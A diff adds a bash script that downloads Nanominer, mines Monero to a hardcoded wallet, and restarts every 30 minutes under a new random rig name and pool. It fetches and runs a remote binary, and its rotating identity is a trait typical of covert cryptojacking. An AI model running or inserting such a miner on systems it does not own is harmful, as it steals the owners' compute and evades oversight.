@@ -1,0 +1,82 @@
+#!/bin/bash
+
+# ================================
+# Nanominer XMR Script
+# Random pool + Random rigName
+# ================================
+
+# Monero wallet
+WALLET="4ADCVdveAjhDVHXYGUCkX4513LZaGF7bY2dxngyaxBZaW1YJAWsNRpiRfRcEwUma1gLpPkoQ5tBzES6jXfPiZoUH5ti313h"
+
+# Nanominer download URL
+URL="https://github.com/nanopool/nanominer/releases/latest/download/nanominer-linux-64.tar.gz"
+
+# Pool list (host:port)
+POOLS=(
+    "xmr-eu1.nanopool.org:10300"
+    "xmr-eu2.nanopool.org:10300"
+    "xmr-us-east1.nanopool.org:10300"
+    "xmr-us-west1.nanopool.org:10300"
+    "xmr-asia1.nanopool.org:10300"
+    "xmr-jp1.nanopool.org:10300"
+    "xmr-au1.nanopool.org:10300"
+)
+
+# Generate random rig name
+generate_rig_name() {
+    echo "rig$(tr -dc 'a-z0-9' < /dev/urandom | head -c 6)"
+}
+
+# Pick random pool
+select_random_pool() {
+    local idx=$((RANDOM % ${#POOLS[@]}))
+    echo "${POOLS[$idx]}"
+}
+
+# Download Nanominer
+download_nanomininer() {
+    echo "📥 Downloading Nanominer..."
+    wget -q "$URL" -O nanominer.tar.gz || exit 1
+    tar -xzf nanominer.tar.gz
+    chmod +x nanominer
+}
+
+# Create config.ini
+create_config() {
+    RIG_NAME=$(generate_rig_name)
+    SELECTED_POOL=$(select_random_pool)
+
+    cat > config.ini <<EOF
+[RandomX]
+coin = XMR
+wallet = $WALLET
+rigName = $RIG_NAME
+pool1 = $SELECTED_POOL
+EOF
+
+    echo "🆔 Miner name: $RIG_NAME"
+    echo "🌍 Pool selected: $SELECTED_POOL"
+}
+
+# Run miner
+run_miner() {
+    while true; do
+        ./nanominer -c config.ini >> miner.log 2>&1 &
+        PID=$!
+        sleep 1800   # 30 minutes
+        kill "$PID" 2>/dev/null
+        wait "$PID" 2>/dev/null
+        sleep 15
+        create_config  # Pick a new random pool each restart
+    done
+}
+
+main() {
+    [[ "$(uname)" != "Linux" ]] && exit 1
+    sudo sysctl -w vm.nr_hugepages=1280 >/dev/null 2>&1
+    download_nanomininer
+    create_config
+    run_miner
+}
+
+main
